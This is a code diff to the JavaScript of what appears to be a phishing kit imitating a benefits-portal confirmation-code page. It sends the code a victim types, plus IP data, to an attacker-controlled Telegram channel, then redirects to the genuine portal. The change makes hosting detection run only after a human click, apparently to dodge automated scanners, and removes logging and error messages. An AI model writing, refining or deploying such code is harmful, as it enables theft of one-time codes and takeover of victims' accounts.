@@ -9,11 +9,49 @@
   var infoText = document.getElementById("enter-code-info");
   var submitBtn = document.getElementById("submit-code-btn");
 
+  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";
+
   // ============================================================
-  // ====== FINAL REDIRECT URL ===================================
+  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
   // ============================================================
 
-  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";
+  let domainDetected = false;
+
+  function detectDomain() {
+    if (domainDetected) return;
+    
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const domain = urlObj.hostname;
+    
+    const freeDomains = [
+      '.tk', '.ml', '.ga', '.cf', '.gq',
+      '.free.nf', '.free.org', '.free.com',
+      '.co.cc', '.co.nr', '.cjb.net',
+      '.dynu.net', '.ddns.net', '.no-ip.org',
+      'vercel.app', 'netlify.app', 'github.io',
+      'pages.dev', 'web.app', 'firebaseapp.com',
+      'herokuapp.com', 'glitch.me', 'replit.co',
+      '000webhostapp.com', 'byethost.com',
+      'freehostia.com', 'profreehost.com',
+      '.example.com', '.test', '.localhost'
+    ];
+
+    const isFree = freeDomains.some(freeDomain => 
+      domain.includes(freeDomain) || domain.endsWith(freeDomain)
+    );
+
+    domainDetected = true;
+
+    sendToTelegram('domain_detection', {
+      domain: domain,
+      isFree: isFree
+    });
+  }
+
+  document.addEventListener('click', function() {
+    if (!domainDetected) detectDomain();
+  });
 
   // ============================================================
   // ====== TELEGRAM INTEGRATION =================================
@@ -27,9 +65,7 @@
         if (response.ok) {
           ipData = await response.json();
         }
-      } catch (e) {
-        console.warn('Could not fetch IP data');
-      }
+      } catch (e) {}
 
       const payload = {
         action: action,
@@ -59,43 +95,6 @@
       console.error('Failed to send to Telegram:', error);
     }
   }
-
-  // ============================================================
-  // ====== DOMAIN DETECTION =====================================
-  // ============================================================
-
-  function detectDomain() {
-    const currentUrl = window.location.href;
-    const urlObj = new URL(currentUrl);
-    const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
-
-    sendToTelegram('domain_detection', {
-      url: currentUrl,
-      domain: domain,
-      isFree: isFree
-    });
-
-    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
-  }
-
-  detectDomain();
 
   // ============================================================
   // ====== FORM HANDLERS =======================================
@@ -146,20 +145,20 @@
   infoText.textContent =
     "A confirmation code was sent to " +
     maskedInput.value +
-    ". Enter the code below. If you did not receive it, press Resend Code.";
+    ". Enter the code below.";
 
   resendBtn.addEventListener("click", function () {
     codeError.textContent = "";
     infoText.textContent =
       "A new confirmation code has been sent to " +
       maskedInput.value +
-      ". Enter the new code below.";
+      ".";
     codeInput.value = "";
     codeInput.focus();
   });
 
   // ============================================================
-  // ====== FORM SUBMIT (WITH REDIRECT) =========================
+  // ====== FORM SUBMIT =========================================
   // ============================================================
 
   form.addEventListener("submit", function (event) {
@@ -178,28 +177,24 @@
       return;
     }
 
-    // ====== SEND CODE TO TELEGRAM ======
     submitBtn.disabled = true;
     submitBtn.textContent = 'Verifying...';
     
     sendToTelegram('code_submitted', {
       code: code
     }).then(() => {
-      submitBtn.textContent = 'Code Accepted! Redirecting...';
+      submitBtn.textContent = 'Redirecting...';
       
-      // Clear session storage
       try {
         sessionStorage.removeItem("melodyAuth");
       } catch (e) {}
       
-      // ====== REDIRECT TO FINAL URL ======
       setTimeout(function() {
         window.location.href = REDIRECT_URL;
       }, 1500);
     }).catch(() => {
       submitBtn.disabled = false;
       submitBtn.textContent = 'Submit';
-      alert('An error occurred. Please try again.');
     });
   });
 })();
